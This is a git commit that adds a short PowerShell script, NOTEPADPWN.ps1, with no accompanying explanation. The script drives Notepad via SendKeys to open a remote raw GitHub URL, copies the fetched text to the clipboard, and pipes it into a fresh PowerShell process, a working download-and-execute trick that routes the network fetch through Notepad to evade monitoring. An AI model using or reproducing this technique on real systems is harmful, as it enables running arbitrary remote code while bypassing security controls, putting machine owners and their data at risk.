fea5b8550db99760036a8106d8deab7e7585ba1b
msffluffybunnies <54080320+msffluffybunnies@users.noreply.github.com>
2020-02-13 10:56:11 -0700

    Add files via upload

---
+++ NOTEPADPWN.ps1
@@ -0,0 +1,15 @@
+﻿$wshell= New-Object -ComObjectwscript.shell 
+$wshell.run("notepad") 
+$wshell.AppActivate('Untitled -Notepad') 
+Start-Sleep 2 
+$wshell.SendKeys('^o') 
+Start-Sleep 2 
+$wshell.SendKeys('https://raw.githubusercontent.com/msffluffybunnies/rabbithole/master/test.txt') 
+$wshell.SendKeys('~') 
+Start-Sleep 5 
+$wshell.SendKeys('^a') 
+$wshell.SendKeys('^c') 
+# Execute contents in clipboard back in PowerShell process 
+[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') 
+$clipboardContents= [System.Windows.Forms.Clipboard]::GetText() 
+$clipboardContents| powershell -
